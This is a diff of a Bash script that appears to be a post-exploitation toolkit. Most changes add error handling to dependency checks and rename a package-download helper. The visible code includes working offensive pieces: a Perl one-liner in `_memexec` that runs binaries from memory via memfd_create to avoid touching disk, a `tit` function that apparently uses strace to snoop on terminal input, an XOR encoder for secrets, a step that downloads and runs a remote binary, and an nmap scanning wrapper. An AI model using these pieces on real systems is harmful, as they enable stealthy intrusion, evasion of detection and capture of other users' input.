@@ -352,7 +352,7 @@ find_subdomains() {
 
 # echo -n "XOREncodeThisSecret" | xor 0xfa
 xor() {
-    _hs_dep perl
+    _hs_dep perl || return
     perl -e 'while(<>){foreach $c (split //){print $c^chr('"${1:-0xfa}"');}}'
 }
 
@@ -535,9 +535,8 @@ xkeep() {
 tit() {
     local str
     local has_gawk
-    _hs_dep strace
-    # _hs_dep gawk
-    _hs_dep grep
+    _hs_dep strace || return
+    _hs_dep grep || return
 
     command -v gawk >/dev/null && has_gawk=1
     [ $# -eq 0 ] && {
@@ -641,16 +640,21 @@ dbin() {
     [ $# -eq 0 ] && { HS_INFO "Example: ${CDC}dbin install nmap"; }
 }
 
-soar() {
+xsoar() {
     hs_mkxhome
+
+    [ "$1" == "dl" ] && shift 1
+
+    export SOAR_ROOT="${XHOME}"
     [ ! -f "${XHOME}/bin/soar" ] && {
         dl "https://github.com/pkgforge/soar/releases/download/nightly/soar-${HS_ARCH}-linux" >"${XHOME}/bin/soar" || return
         chmod 755 "${XHOME}/bin/soar"
-        export SOAR_ROOT="${XHOME}"
         \soar sync
     }
-    \soar "$@"
+    ( cd "${XHOME}/bin" && \soar dl "$@" )
 }
+
+alias soar="xsoar"
 
 bin_dl() {
     local dst="${XHOME}/${1:?}"
@@ -1534,6 +1538,7 @@ xdestruct() {
 _memexec() {
     local name="${1}"
 
+    _hs_dep perl || return
     shift
     perl '-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}"'"${name:-/usr/bin/python3}"'",@ARGV' -- "$@"
     return $?
@@ -1746,7 +1751,7 @@ scan() {
     local port
 
     [ $# -lt 2 ] && { xhelp_scan; return 255; }
-    _hs_dep nmap
+    _hs_dep nmap || return
     port="${1:?}"
     shift 1
     for ip in "$@"; do
